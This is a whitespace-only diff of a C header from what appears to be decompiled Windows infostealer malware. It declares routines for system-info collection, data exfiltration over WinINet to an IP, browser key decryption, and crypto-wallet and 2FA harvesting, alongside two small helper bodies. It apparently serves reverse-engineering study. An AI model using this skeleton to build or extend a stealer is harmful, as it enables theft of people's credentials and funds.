@@ -1,25 +1,25 @@
 #ifndef HEADER_H
 #define HEADER_H
 
-CHAR *__thiscall 
+CHAR *__thiscall
 CollectSystemInfo(DWORD *SharedBuff);
 
-char* __fastcall 
+char* __fastcall
 TrasStrings(char* src);
 
-PWSTR 
+PWSTR
 *GetFilePath(wchar_t *Src);
 
-int32_t __fastcall 
+int32_t __fastcall
 ProcessAndSendData(int32_t* inputData);
 
-size_t __cdecl 
-ProcessMultipartRequest(void *dataToSend, 
-                        size_t dataSize, 
-                        size_t *bufferSize, 
+size_t __cdecl
+ProcessMultipartRequest(void *dataToSend,
+                        size_t dataSize,
+                        size_t *bufferSize,
                         PSTR IPaddrs);
 
-PSTR __fastcall 
+PSTR __fastcall
 ProccessingOrMapsTheWideCharacter(wchar16* lpWideCharStr)
 {
         if (lpWideCharStr)
@@ -45,31 +45,31 @@ ProccessingOrMapsTheWideCharacter(wchar16* lpWideCharStr)
             // 54936 (GB18030, Windows Vista and later) :
             // dwFlags must be set to either 0
             int32_t cbMultiByte = WideCharToMultiByte(0xfde9, 0, lpWideCharStr, 0xffffffff, nullptr, 0, nullptr, nullptr);
-            
+
             if (cbMultiByte)
             {
                 int32_t edx_1;
                 edx_1 = cbMultiByte >= 0xffffffff;
                 int32_t var_14_1 = -(edx_1) | (cbMultiByte + 1);
                 PSTR lpMultiByteStr = Alloc();
-                
+
                 if (lpMultiByteStr)
                 {
                     if (WideCharToMultiByte(0xfde9, 0, lpWideCharStr, 0xffffffff, lpMultiByteStr, cbMultiByte, nullptr, nullptr))
                         return lpMultiByteStr;
-                    
+
                     _free(lpMultiByteStr);
                 }
             }
         }
-        
+
         return nullptr;
 }
 
 int __fastcall
 ProcessFilePathAndUpdateSession(void **SysInfo, char *filePath);
 
-int __thiscall 
+int __thiscall
 checkFileStatus(WCHAR *TheRealOne)
 {
     const WCHAR *resolvedPath;
@@ -96,7 +96,7 @@ checkFileStatus(WCHAR *TheRealOne)
     fileCheckStruct[4] = 0;
     fileCheckStruct[5] = 0;
     fileCheckStruct[0] = 24;
-    fileCheckStruct[3] = 64; 
+    fileCheckStruct[3] = 64;
     fileCheckStruct[2] = Checkskiddi__TheRealOne__file;
     Checkskiddi__TheRealOne__file[0] = 2 * lstrlenW(__TheRealOne__);
     pathLength = lstrlenW(__TheRealOne__);
@@ -114,7 +114,7 @@ checkFileStatus(WCHAR *TheRealOne)
     return result;
 }
 
-int 
+int
 verifyFileStatus(WCHAR *TheRealOne)
 {
     int result;
@@ -131,34 +131,34 @@ verifyFileStatus(WCHAR *TheRealOne)
     return 1;
 }
 
-int __cdecl 
-WinnetDllFuncRelatedExfiltrationRoutineetc(const char *postData, 
-                                           int dataSize, 
+int __cdecl
+WinnetDllFuncRelatedExfiltrationRoutineetc(const char *postData,
+                                           int dataSize,
                                            int extraParam,
                                            PSTR ip195);
 
-void 
-DecryptKeyData(const WCHAR *TheRealOne_, 
-                int *rawFileData, 
+void
+DecryptKeyData(const WCHAR *TheRealOne_,
+                int *rawFileData,
                 int *fileDataSize);
 
-int __fastcall 
-ExtractFileInfoViaNTDLL(void *TheRealOne_, 
-                        DWORD *encryptedKey, 
+int __fastcall
+ExtractFileInfoViaNTDLL(void *TheRealOne_,
+                        DWORD *encryptedKey,
                         size_t *resultLength);
 
-DWORD *__thiscall 
+DWORD *__thiscall
 StripUTF8BOMAndParse(const char *encryptedKey);
 
-int __thiscall 
+int __thiscall
 ValidateKeyStructure(DWORD *keyV);
 
-int __fastcall 
-ExtractValueFromKeyPath(DWORD *table, 
+int __fastcall
+ExtractValueFromKeyPath(DWORD *table,
                         const char *key);
 
-void __fastcall 
-CryptoWallrtsAnd2FA(LPCWSTR *BrowserAllInfo, 
+void __fastcall
+CryptoWallrtsAnd2FA(LPCWSTR *BrowserAllInfo,
                     void ***SysInfo);
 
 int32_t __fastcall processPath(PWSTR fileExtension,
